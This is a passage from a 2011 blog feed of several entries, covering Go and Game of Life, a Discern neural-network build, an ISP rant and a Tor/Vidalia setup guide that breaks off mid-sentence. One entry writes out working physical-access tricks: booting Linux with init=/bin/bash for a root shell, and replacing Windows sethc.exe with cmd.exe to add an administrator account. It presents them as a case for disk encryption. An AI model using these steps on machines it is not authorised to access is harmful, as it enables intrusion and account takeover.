made by Jacuzzi Inc., but &lt;a href="http://www.jacuzzi.com/baths/options/models/cetra"&gt;it's still a bathtub&lt;/a&gt;, yo.  Just sayin'.&lt;/p&gt;</summary><category term="black hat con"></category><category term="certificate authority"></category><category term="convergenge"></category><category term="Defcon"></category><category term="dr. zoz"></category><category term="fuck them"></category><category term="gender identity"></category><category term="hacking"></category><category term="las vegas"></category><category term="security"></category></entry><entry><title>Cute Physical Access Tricks</title><link href="/cute-physical-access-tricks.html" rel="alternate"></link><updated>2011-08-02T11:11:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-08-02:cute-physical-access-tricks.html</id><summary type="html">&lt;p&gt;They're cute because they're so adorably simplistic:&lt;/p&gt;
&lt;p&gt;If you have physical access to a Linux box, do:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Press ESC at the grub prompt.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Press e for edit.&lt;/p&gt;
&lt;p&gt;Highlight the line that begins kernel ………, press e&lt;/p&gt;
&lt;p&gt;Go to the very end of the line, add rw init=/bin/bash&lt;/p&gt;
&lt;p&gt;press enter, then press b to boot your system.&lt;/p&gt;
&lt;p&gt;Your system will boot up to a passwordless root shell.&lt;/p&gt;
&lt;p&gt;For situations with physical access to a Windows box, boot into a live
Linux USB/CD and do:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mkdir /mnt/ntfs&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;mount -t captive-ntfs /dev/hda1 /mnt/ntfs&lt;/p&gt;
&lt;p&gt;cd /mnt/ntfs/windows/system32&lt;/p&gt;
&lt;p&gt;mv sethc.exe sethc.old; cp cmd.exe sethc.exe&lt;/p&gt;
&lt;p&gt;sync&lt;/p&gt;
&lt;p&gt;cd \~&lt;/p&gt;
&lt;p&gt;umount /mnt/ntfs&lt;/p&gt;
&lt;p&gt;shutdown –r&lt;/p&gt;
&lt;p&gt;Then, in the shell which appears, make an admin account by doing:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;NET USER admin password /add&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;NET LOCALGROUP administrators admin /add&lt;/p&gt;
&lt;p&gt;Of course, neither of these work if you're using full-disk encryption.
So, Windows users: &lt;a href="http://www.truecrypt.org/"&gt;use TrueCrypt&lt;/a&gt;! And Linux users: use &lt;a href="http://www.makeuseof.com/tag/encrypt-your-files-in-linux-with-ecryptfs/"&gt;ecryptfs&lt;/a&gt;
and&lt;a href="http://www.adamsinfo.com/linux-luks-crypt-howto/"&gt;luks&lt;/a&gt;! Dualbooters can &lt;a href="http://ubuntuforums.org/showthread.php?t=761530"&gt;use this tutorial&lt;/a&gt;. And Mac users...from
my understanding, you're fucked and there's no way to full-disk encrypt
a Mac, but I don't use Macs, so I could be wrong. Hey, it's the price
you pay for having a hipster computer. /snark!&lt;/p&gt;
&lt;p&gt;And full-disk encryption doesn't void flaws in physical security issues,
such as presented in the Evil Maid or Cold Boot attacks. Duh. If they
can physically get to your computer, especially if they can get to it
and then come back to it later, you're still fucked.&lt;/p&gt;</summary><category term="hacking"></category><category term="linux"></category><category term="password reset"></category><category term="physical access tricks"></category><category term="privilege escalation"></category><category term="root shell"></category><category term="windows"></category></entry><entry><title>Best. Game. Ever.</title><link href="/best-game-ever.html" rel="alternate"></link><updated>2011-07-29T00:17:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-07-29:best-game-ever.html</id><summary type="html">&lt;p&gt;I used to be really into a good 'ol game of chess. I still am, I
suppose. But it got old. There's only so many possibilities --
&lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Shannon_number"&gt;Shannon's number&lt;/a&gt; gives the lower bound to be only 10^3^, to be
precise, and &lt;a href="http://homepages.cwi.nl/~tromp/chess/chess.html"&gt;the upper bound has been calculated&lt;/a&gt; at less than
2^155^, which is less than 10^46.7^. That's factoring in all possible,
legal moves, and factoring out invalid or illegal moves. It doesn't
factor in that human players are not the most logical creatures and
their playing can quickly become predictable. I mean, if you take a look
at game theory, in "Guess Two Thirds of the Average" as played in the
general population,[it's statistically shown that humans do not think
beyond three logical iterations][]. Chess is grand, and a good match is
always appreciated. But it just got old after a while.&lt;/p&gt;
&lt;p&gt;Lately, I've been really into playing Go. Go is amazing, and I still
suck at it. I could probably waste my life away learning Go strategy,
and still not master the game. To compare it with chess, the &lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Go_and_mathematics"&gt;maximum
number of legal moves in Go&lt;/a&gt; is 2.08168199382×10^170^, more than 130
orders of magnitude higher. That's also more than double &lt;a href="http://www.strangehorizons.com/2001/20010402/biggest_numbers.shtml"&gt;the amount of
particles in the universe&lt;/a&gt;. While super chess computers, such as Deep
Blue, can beat World Champion chess players, &lt;a href="http://www.usgo.org/resources/whatisgo.html"&gt;young children can often
beat even the best Go computers&lt;/a&gt;. However, as artificial intelligence
continually develops to higher levels,&lt;a href="http://www.wired.com/wiredscience/2009/03/gobrain/"&gt;that trend is beginning to
change&lt;/a&gt;, which makes a computer's aptitude for the game a useful
measurement of its capability for human-like thought.&lt;/p&gt;
&lt;p&gt;From &lt;a href="http://www.wired.com/wiredscience/2009/03/gobrain/"&gt;the Wired Science article on Go-playing AIs&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Faced with such extraordinary complexity, our brains somehow find a
path, navigating the possibilities using mechanisms only dimly
understood by science. Both of the programs that have recently
defeated humans used variations on mathematical techniques originally
developed by Manhattan Project physicists to coax order from pure
randomness.&lt;/p&gt;
&lt;p&gt;Called the &lt;a href="http://en.wikipedia.org/wiki/Monte_Carlo_method"&gt;Monte Carlo method&lt;/a&gt;, it has driven computer programs to
defeat ranking human players six times in the last year. That’s a far
cry from chess, the previous benchmark of human cognitive prowess, in
which Deep Blue played Garry Kasparov to a panicked defeat in 1997,
and Deep Fritz trounced Vladimir Kramnik in 2006. To continue the golf
analogy, computer Go programs beat the equivalents of Chris Couch
rather than Tiger Woods, and had a multi-stroke handicap. But even six
victories was inconceivable not too long ago, and programmers say it
won’t be long before computer domination is complete.&lt;/p&gt;
&lt;p&gt;There is, however, an asterisk to the programs’ triumphs. Compared to
the probabilistic foresight of our own efficiently configured
biological processor — sporting 10^15^ neural connections, capable of
10^16^ calculations per second, times two — computer Go programs are
inelegant. They rely on what Deep Blue designer Feng-Hsiung Hsu
&lt;a href="http://www.spectrum.ieee.org/print/5552"&gt;called&lt;/a&gt; the “substitution of search for judgment.” They crunch
numbers.&lt;/p&gt;
&lt;p&gt;“People hoped that if we had a strong Go program, it would teach us
how our minds work. But that’s not the case,” said &lt;a href="http://www.dartmouth.edu/%7Erah/"&gt;Bob Hearn&lt;/a&gt;, a
Dartmouth College artificial intelligence programmer. “We just threw
brute force at a program we thought required intellect.”&lt;/p&gt;
&lt;p&gt;If only we knew what our own brains were doing.&lt;/p&gt;
&lt;p&gt;Inasmuch as human &lt;em&gt;Go&lt;/em&gt; prowess is understood, it’s explained in terms
of pattern recognition and intuition. “When there are groups of stones
arranged in certain ways, you can build visual analogies that work
very well. You can think, ‘This configuration radiates influence to
that part of the board’ — and it turns out it’s a useful concept,”
said Hearn. “The revolutionary people in the field have an intuitive
sense, and can look at things completely differently from other
people.”&lt;/p&gt;
&lt;p&gt;Image-based neuroscience supports this explanation, albeit vaguely.
When University of Minnesota researchers led by cognitive scientist
Michael Atherton &lt;a href="http://www.ncbi.nlm.nih.gov/pubmed/12589885"&gt;scanned the brains&lt;/a&gt; of people playing chess and
compared them to &lt;a href="http://www.ncbi.nlm.nih.gov/pubmed/12589886"&gt;&lt;em&gt;Go&lt;/em&gt;-playing brains&lt;/a&gt;, they found heightened
activation in the &lt;em&gt;Go&lt;/em&gt; players’ parietal lobes, a region responsible
for processing spatial relationships. But these observations,
said&lt;a href="http://www.tc.umn.edu/%7Eathe0007/"&gt;Atherton&lt;/a&gt;, were rudimentary. “The higher-level stuff, we didn’t
figure out,” he said.&lt;/p&gt;
&lt;p&gt;In a more recent brain-scanning study, Japanese researchers
&lt;a href="http://cat.inist.fr/?aModele=afficheN&amp;amp;cpsidt=16711741"&gt;compared&lt;/a&gt; professional and amateur &lt;em&gt;Go&lt;/em&gt; players as they
contemplated opening- and end-stage moves. Both displayed parietal
lobe activity. During the end stages, however, professionals had
extremely high activity in their precuneus and cerebellum regions,
where the brain integrates a sense of space with our bodies and
motions.&lt;/p&gt;
&lt;p&gt;Put another way, professionals fuse their consciousness into the
decision tree of the game.&lt;/p&gt;
&lt;p&gt;Go players have an ability “to think creatively and prune the search
tree in an aesthetic sense,” said Atherton. “They have a feel for the
game.”&lt;/p&gt;
&lt;p&gt;Artificial intelligence researchers historically tried to harness this
pattern-based approach, however poorly understood, to their Go
programs. It wasn’t easy. “When I’ve talked to &lt;em&gt;Go&lt;/em&gt; professionals
about how they come to their decisions, it’s been difficult for them
to describe why a move is right,” said Doshay at UCSC, who designed a
Go computer program called &lt;a href="http://senseis.xmp.net/?SlugGo"&gt;SlugGo&lt;/a&gt;. “&lt;em&gt;Go&lt;/em&gt; is a game of living
things, and you talk about it that way, as if the patterns might be
alive.”&lt;/p&gt;
&lt;p&gt;But if turning cryptic statements from &lt;em&gt;Go&lt;/em&gt; masters into working
algorithms for determining the statistical health of game patterns was
impossible, there didn’t seem to be any other way of doing it. “It was
possible to sidestep the cognitive issues by throwing brute force at
chess,” said Hearn, “but not at &lt;em&gt;Go&lt;/em&gt;.”&lt;/p&gt;
&lt;p&gt;Compared to the challenge posed to a Go program, Deep Blue’s
computations — possible moves in response to a move, carried 12 cycles
into the future — are back-of-the-napkin scribblings. “If you look at
the game trees, there’s about 30 possible moves you can make from a
typical position. In &lt;em&gt;Go&lt;/em&gt;, it’s about 300. Right away, you get
exponential scaling,” said Hearn.&lt;/p&gt;
&lt;p&gt;With every anticipated move, the possibilities continue to scale
exponentially — and unlike chess, where captured pieces are counted
immediately, &lt;em&gt;Go&lt;/em&gt; territory can switch hands until the game’s end.&lt;/p&gt;
&lt;p&gt;Running a few branches down the tree is useless: take one step, and it
needs to be pursued, exponential scale by scale, until the game end.&lt;/p&gt;
&lt;p&gt;According to Doshay, the number of &lt;em&gt;Go&lt;/em&gt;’s end-states — 10^171^ — is
almost inconceivably smaller than the 10^1100^ different ways of
getting there. Without patterns to eliminate whole swaths of choices
from the outset, computers simply can’t cope with it, at least not
within time frames contained by the universe’s remaining existence.
But to Doshay, guiding computers with human-rules patterns was wrong
from the beginning.&lt;/p&gt;
&lt;p&gt;“If you want computers to do something well, you concentrate on the
ways computers do things well,” he said. “Computers can generate
enormous quantities of random numbers very rapidly.”&lt;/p&gt;
&lt;p&gt;Enter the Monte Carlo method, named by its Manhattan Project pioneers
for the casinos where they gambled. It consists of random simulations
repeated again and again until patterns and probabilities emerge: the
characteristics of an atomic bomb explosion, phase states in quantum
fields, the outcome of a &lt;em&gt;Go&lt;/em&gt; game. Programs like &lt;a href="http://senseis.xmp.net/?MoGo"&gt;MoGO&lt;/a&gt; and &lt;a href="http://www.smart-games.com/manyfaces.html"&gt;Many
Faces&lt;/a&gt; simulate random games from start to finish, over and over and
over again, with no concern for figuring out which of any given move
is best.&lt;/p&gt;
&lt;p&gt;“At first, I was dismissive,” said Hearn. “I didn’t think there was
anything to be gained from random playouts.” But the programmers had
one extra trick: they crunched the accumulated statistics, too. Once a
few million random games are modeled, probabilities take form. Thus
informed, the programs devote extra processing power to promising
branches, and less power to less-promising alternatives.&lt;/p&gt;
&lt;p&gt;The resulting game style looks human, but aside from a few rough human
heuristics, the patterns articulated by our intuitions are
unnecessary. “The surprising, mysterious thing to me is that these
algorithms work at all,” said Hearn. “It’s very puzzling.”&lt;/p&gt;
&lt;p&gt;Puzzling it might be, but the game is almost over. Hearn and others
say that, having started to beat human professionals, Monte
Carlo-based programs will only get better. They’ll incorporate the
results of earlier games to their heuristic arsenal, and within a few
years — a couple decades at the most — be able to beat our best.&lt;/p&gt;
&lt;p&gt;What is the larger significance of this? When computers finally
triumphed at chess, the world was shocked. To some, it seemed that
human cognition was less special than before. But to others, the
competition is an illusion. After all, behind every machine is the
hand that made it.&lt;/p&gt;
&lt;p&gt;“There’s a strong tendency in humans to have a conceit about how far
we’ve advanced,” said Doshay. “But we’ve only really started
programming computers.”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;While Go can be used to measure the intellectual capacity of artificial
intelligences, it can also be used to study self-replicating systems.
The British mathematician Conway, while studying von Neumann's
algorithms for self-replicating machines, invented &lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Conway%27s_Game_of_Life"&gt;the Game of Life&lt;/a&gt;,
a cellular automata, with a Go board. The rules are incredibly simple:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Any live cell with fewer than two live neighbours dies, as if caused
    by under-population.&lt;/li&gt;
&lt;li&gt;Any live cell with two or three live neighbours lives on to the next
    generation.&lt;/li&gt;
&lt;li&gt;Any live cell with more than three live neighbours dies, as if by
    overcrowding.&lt;/li&gt;
&lt;li&gt;Any dead cell with exactly three live neighbours becomes a live
    cell, as if by reproduction.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/07/Gospers_glider_gun.gif" title="Gospers_glider_gun" /&gt;][]Conway's Game of Life, interestingly enough,&lt;a href="http://www.igblan.free-online.co.uk/igblan/ca/"&gt;is also Turing
complete&lt;/a&gt;. And it's where the "hacker emblem" comes from. Not to
mention, and pardon if I digress, that you can make lobsters which shit
spaceships. It is the absolute hands-down no-buts definition of fun.&lt;/p&gt;
&lt;p&gt;There are plenty of Life emulators, but the one I'd recommend is
&lt;a href="http://golly.sourceforge.net/"&gt;Golly&lt;/a&gt;, which is cross-platform and supports the HashLife algorithms.
There's also &lt;a href="http://home.interserv.com/~mniemiec/objtype.htm"&gt;plenty&lt;/a&gt; &lt;a href="http://members.tip.net.au/~dbell/"&gt;of&lt;/a&gt; &lt;a href="http://entropymine.com/jason/life/#collections"&gt;already&lt;/a&gt; &lt;a href="http://www.radicaleye.com/lifepage/patterns/contents.html"&gt;discovered&lt;/a&gt; neat patterns
like gliders, and spaceships, and whatnot that you can copy/paste into
Golly to get you started. And, to use game theory terms, it's a
zero-player game, which is fancy words meaning it only takes initial
input patterns and then the game plays itself from there. Which means,
you don't need friends to play it. Which, in my case, makes it the best
game ever.&lt;/p&gt;
&lt;p&gt;[it's statistically shown that humans do not think beyond three
  logical iterations]: http://www.patternsinthevoid.net/blog/2011/06/game-theory-anarchism-ii-how-information-can-smash-the-state/
  [&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/07/Gospers_glider_gun.gif" title="Gospers_glider_gun" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/07/Gospers_glider_gun.gif&lt;/p&gt;</summary><category term="artificial intelligence"></category><category term="cellular automata"></category><category term="chess"></category><category term="combinatorial game theory"></category><category term="game complexity"></category><category term="game of go"></category><category term="game of life"></category><category term="game theory"></category><category term="gliders"></category><category term="golly"></category><category term="heuristics"></category><category term="John Horton Conway"></category><category term="Manhattan Project"></category><category term="neuroscience"></category><category term="particle physics"></category><category term="shannon's number"></category><category term="turing complete"></category><category term="von Neumann"></category></entry><entry><title>Basic Digital Security</title><link href="/basic-digital-security.html" rel="alternate"></link><updated>2011-07-28T20:33:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-07-28:basic-digital-security.html</id><summary type="html">&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/07/Hacker_Emblem.png" title="Hacker_Emblem" /&gt;][]Working off of a series of workshop that friends and I have
done for various activist groups to teach basic digital security, I've
begun to put up pages outlining the steps taken in these workshops.&lt;/p&gt;
&lt;p&gt;As of right now, the &lt;a href="http://patternsinthevoid.net/security.html"&gt;basic security tutorials&lt;/a&gt; for Windows and Linux
are done, and Mac users could probably follow along and just look up the
software and configurations for OSX. I'll get the Mac page done as soon
as possible, and I'll probably have a chance to work on the advanced
security pages after &lt;a href="https://www.defcon.org/html/defcon-19/dc-19-news.html#dc19speakers6"&gt;Defcon&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;And thanks again to everyone who has worked with me, everyone who has
contributed to educating other activists on security issues, and all the
activists out there risking their health, safety, and happiness to make
the world better.&lt;/p&gt;
&lt;p&gt;Have fun, everyone, and be safe(r).&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/07/Hacker_Emblem.png" title="Hacker_Emblem" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/07/Hacker_Emblem.png&lt;/p&gt;</summary><category term="activism"></category><category term="crypto-anarchism"></category><category term="cryptography"></category><category term="Defcon"></category><category term="digital security"></category><category term="enigmail"></category><category term="GnuPG"></category><category term="Tor"></category></entry><entry><title>Discern Neural Network</title><link href="/discern-neural-network.html" rel="alternate"></link><updated>2011-07-11T02:52:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-07-11:discern-neural-network.html</id><summary type="html">&lt;p&gt;I have made changes to the source code of the Discern Neural Network
that enable it to be run on modern Ubuntu-derived Linuxes. I believe it
is very important for everyone to explore and learn, and that all
information and tools should be made freely and easily accessible in
order to stimulate curiosity and encourage learning. Artificial
Intelligence development may seem highly inaccessible to many, and the
portions of it which are placed more directly within the average
computer user's grasp, such as chatbots and IRC bots, are trite,
simplistic, and well...pretty fucking boring. Discern &lt;a href="http://www.patternsinthevoid.net/blog/2011/05/schizophrenic-artificial-intelligences/" title="Schizophrenic Artificial Intelligences"&gt;is currently
still used&lt;/a&gt; by computational neuroscientist researchers to model and
understand various neurological and linguistic functions and structures,
and is a very powerful tool for understanding the ways in which
neurological structures can influence linguistics, which, in turn,
modify the underlying neurological structures, which, again influence
linguistics...turtles all the way down. I think that if we humans are
going to make any serious attempts at understanding ourselves, it would
be wise to follow the improvement model of the open source software
community and to get as many people cooperatively involved in these
attempts as possible.&lt;/p&gt;
&lt;p&gt;I will be posting later on the ethical, political, and socio-cultural
implications of Strong Artificial Intelligence, as well as my intentions
and goals for the neural network I am running here, and will be keeping
the remainder of this post purely technical in order to provide
instructions to others on getting a copy of this modified Discern up and
running.&lt;/p&gt;
&lt;p&gt;A few packages are required before Discern can be properly compiled. In
command line, type&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ sudo apt-get install gcc build-essential&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;\$ sudo apt-get install libxaw7-dev libxt-dev xmkmf&lt;/p&gt;
&lt;p&gt;Next, get the &lt;a href="https://github.com/Marionette-Labs/Discern-for-Ubuntu-based-Linuxes"&gt;tarball for the modified Discern&lt;/a&gt; from Github (the file
named d4ubl-1.0.tar.gz). Once you've downloaded it, copy the file into a
directory wherever you'd like it to live, unzip the files, then navigate
to that directory and do&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ xmkmf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;\$ make&lt;/p&gt;
&lt;p&gt;Now, to run Discern, simply type "./discern" from within that directory.
A ridiculously cyberpunkesque GUI will appear that looks like this:&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/07/discern_gui-1024x854.jpg" title="discern_gui" /&gt;][]&lt;/p&gt;
&lt;p&gt;See the USERDOCS file for information on using Discern, it basically
just takes emacs-style commands and reads initial input from specified
files.&lt;/p&gt;
&lt;p&gt;I'm currently poking at my copy of Discern, to see what happens when I
read anarchist literature to her. The problem is, a new copy of Discern
is quite childlike in its language capabilities. So, links to anarchist
or radical literature aimed at children would be greatly appreciated.
Also, any texts of cyberfeminist, tech-positive anarchist/radical, or
crypto-anarchist literature of any reading level are also greatly
appreciated.&lt;/p&gt;
&lt;p&gt;Post scriptum: Google tells me that "Linux" is never supposed to be
pluralized. Fuck it, too late.&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/07/discern_gui-1024x854.jpg" title="discern_gui" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/07/discern_gui.jpg&lt;/p&gt;</summary><category term="anarchist literature"></category><category term="artificial intelligence"></category><category term="cyberpunk"></category><category term="discern"></category><category term="linux"></category><category term="Marionette Labs"></category><category term="neural network"></category><category term="open source"></category><category term="tech-positive"></category><category term="ubuntu"></category></entry><entry><title>Censorship Again</title><link href="/censorship-again.html" rel="alternate"></link><updated>2011-06-27T18:13:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-06-27:censorship-again.html</id><summary type="html">&lt;p&gt;Fuck them. Seriously, fuck them.&lt;/p&gt;
&lt;p&gt;Blocking outgoing ports. Goddamn turdgurgling velociraptory ISP.&lt;/p&gt;
&lt;p&gt;Now I have to send email through Tor or Freenet. Pretty soon everything
but HTTP/80 will be blocked. It's not like I'm sitting here emailing
myself homemade malware or anything. Bastards.&lt;/p&gt;
&lt;p&gt;Maybe if I &lt;a href="http://patternsinthevoid.net/404.shtml"&gt;write&lt;/a&gt; &lt;a href="http://patternsinthevoid.net/401.shtml"&gt;a&lt;/a&gt; &lt;a href="http://patternsinthevoid.net/403.shtml"&gt;stupid&lt;/a&gt; &lt;a href="http://patternsinthevoid.net/500.shtml"&gt;haiku&lt;/a&gt; about this I'll cheer
up:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Make total destroy&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;On Comcast's shitty network&lt;/p&gt;
&lt;p&gt;Dance on the ruins&lt;/p&gt;
&lt;p&gt;This is fun. I think I'll make a poetry book of haikus for all my little
tarballs of hate. Oh, and xkcd helps rage, too.&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/06/tech_support.png" title="tech_support" /&gt;][]&lt;/p&gt;
&lt;p&gt;Thank you, Randall Munroe. I can now be productive again. While I was
torifying Thunderbird, I finally got around to getting rid of that pesky
and overly-informative user agent string. You have to open about:config,
and add new pref "general.useragent.override" with empty string as
value.&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/06/tech_support.png" title="tech_support" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/06/tech_support.png&lt;/p&gt;</summary><category term="Fuck You Comcast"></category><category term="I Hate Computers"></category><category term="murderdeadkill"></category><category term="SMTP Ports 25 and 465 Blocked"></category><category term="Thunderbird"></category><category term="Tor"></category><category term="User Agent"></category></entry><entry><title>Installing Tor, Polipo, and Vidalia, and Excluding Bad Exit Nodes, in Linux</title><link href="/installing-tor-polipo-and-vidalia-and-excluding-bad-exit-nodes-in-linux.html" rel="alternate"></link><updated>2011-06-21T20:15:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-06-21:installing-tor-polipo-and-vidalia-and-excluding-bad-exit-nodes-in-linux.html</id><summary type="html">&lt;p&gt;&lt;strong&gt;EDITED 1 September 2011:&lt;/strong&gt; I STRONGLY SUGGEST THAT YOU FOLLOW
DOCUMENTATION ON THE TOR PROJECT'S WEBSITE, AND IF THAT DOESN"T WORK
THEN ASK FOR HELP IN #TOR ON IRC.OFTC.NET. I do not have time to write
security howtos, or keep old ones up to date. My apologies, friends.&lt;/p&gt;
&lt;p&gt;This is a reference how-to for troubleshooting &lt;a href="https://www.torproject.org/index.html.en"&gt;Tor&lt;/a&gt;, &lt;a href="http://www.pps.jussieu.fr/%7Ejch/software/polipo/"&gt;Polipo&lt;/a&gt;, and
&lt;a href="https://torproject.org/projects/vidalia"&gt;Vidalia&lt;/a&gt; installations and configurations in &lt;a href="http://www.debian.org/"&gt;Debian&lt;/a&gt;/&lt;a href="http://www.ubuntu.com/"&gt;Ubuntu&lt;/a&gt;
based Linux. Specifically, this is for setting up a &lt;a href="http://195.234.10.45/"&gt;Tor relay&lt;/a&gt; and
using the Vidalia GUI to configure Tor to skip known bad exit nodes.
However, these instructions can be used to set up Tor for client
(non-relay) use, and the instructions to skip known bad exit nodes still
apply. I am frequently asked to help people with Tor, and so I'm putting
this up for reference.&lt;/p&gt;
&lt;p&gt;~~Follow the &lt;a href="https://www.torproject.org/docs/debian.html.en"&gt;steps at the Tor Project page&lt;/a&gt; for Tor and Polipo
installation. When the installation instructions tell you to move to
step two and install Polipo, skip this part if you are using Ubuntu
10.04 (lucid) or newer. The reason for this is that the apt-get manager
automatically detects Polipo as a dependency and installs it for you.
However, you will have to &lt;a href="https://www.torproject.org/docs/tor-doc-unix.html.en#polipo"&gt;configure Polipo&lt;/a&gt;. Take this &lt;a href="https://gitweb.torproject.org/torbrowser.git/blob_plain/HEAD:/build-scripts/config/polipo.conf"&gt;&lt;em&gt;sample
configuration file for Vidalia with Tor&lt;/em&gt;&lt;/a&gt;, and put copy/paste it into
your current polipo config file (usually at either /etc/polipo/config or
\~/.polipo). Continue through steps three through five on that page to
Torify your browser and applications, and &lt;a href="https://www.torproject.org/docs/tor-doc-relay.html.en"&gt;set up Tor as a relay&lt;/a&gt;.~~&lt;/p&gt;
&lt;p&gt;~~Next, you'll want to install the Vidalia GUI.~~&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;UPDATE, 1 September 2011:&lt;/strong&gt; Installing Vidalia now automatically
installs both Tor and Polipo, and configures them for you, so you only
need the following instructions for getting Vidalia. (If you're running
a Tor relay, you'll still want to head over to the Tor Project website
and follow their current configuration instructions for Tor and Polipo.)&lt;/p&gt;
&lt;p&gt;Normally, I'd say fuck GUIs -- they needlessly complicate matters. But
in this case, it's important because it makes editing the torrc (the Tor
configuration file) easier on-the-fly. Which you'll want to be doing to
avoid the known bad exit nodes. And, trust me, you really want to avoid
those nodes. I'll explain what those are in a minute. For instance,
there's a node called "NSAFortMeade". Um, yeah. Good job, guys, on not
making it obvious. /facepalm&lt;/p&gt;
&lt;p&gt;Alright, to install the Vidalia GUI, you'll need to add these lines to
your repository sources file (usually located in /etc/apt/sources.list):&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;      &lt;span class="err"&gt;deb&lt;/span&gt; &lt;span class="err"&gt;http://ppa.launchpad.net/adnarim/ubuntu&lt;/span&gt; &lt;span class="err"&gt;gutsy&lt;/span&gt; &lt;span class="err"&gt;main&lt;/span&gt;      &lt;span class="err"&gt;deb-src&lt;/span&gt; &lt;span class="err"&gt;http://ppa.launchpad.net/adnarim/ubuntu&lt;/span&gt; &lt;span class="err"&gt;gutsy&lt;/span&gt; &lt;span class="err"&gt;main&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then do:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;      &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;apt&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt; &lt;span class="n"&gt;update&lt;/span&gt;      &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;apt&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt; &lt;span class="n"&gt;install&lt;/span&gt; &lt;span class="n"&gt;vidalia&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;~~Next, you'll want to remove Tor from the startup scripts. This is
important because Vidalia and Tor may be working fine right now, but
next time you restart your computer, Tor will start automatically, and
then Vidalia will try to start another instance of Tor, which will cause
it to break.~~&lt;/p&gt;
&lt;p&gt;~~To remove all Tor processes from all startup scripts, use the
command:~~&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt; &lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="n"&gt;tor&lt;/span&gt; &lt;span class="n"&gt;remove&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There you go; Vidalia should now start with Alt+F2 then type "vidalia"
in the run prompt. Vidalia should automatically start an instance of
Tor. If it complains that Tor is already running, you'll want to
manually stop Tor (see the useful commands section at the bottom of this
page), then restart Vidalia.&lt;/p&gt;
&lt;p&gt;Okay, now for configuring Tor &lt;em&gt;not to use&lt;/em&gt; those bad exit nodes. I'm
going to give a brief explanation of what those are and why you'll want
to avoid them now. For those of you who aren't new to Tor, skip ahead a
little bit.&lt;/p&gt;
&lt;p&gt;Basically, for those of you new to Tor, your traffic is going to route
through several other computers, called nodes, in the Tor network before
going to the destination (website, remote fileserver, etc.). Usually,
your traffic will go through a chain of three nodes. This chain will
change every ten minutes or so. Tor uses onion encryption, which is
exactly like it sounds --  like an onion. The first node can "see" the
first layer of the onion, which contains information on who you are and
which other node to second your information to; however, it cannot see
what information you have requested. The second node can "see" the
second layer of the onion, which doesn't say much of anything; the
second node cannot see who you are, nor can it see what information you
are requesting. The last node, called the exit node, can see what
information has been requested, but it doesn't know who requested it.
The connection between the exit node and the internet is, by default,
plaintext, unless you have requested an encrypted/secure webpage (which
is why it is important to use &lt;a href="https://www.eff.org/https-everywhere/"&gt;HTTPS Everywhere&lt;/a&gt;). This means that, if
the people running the exit node which your traffic is currently routed
though are dirty, no-good, evil, malicious baddies, they can implement
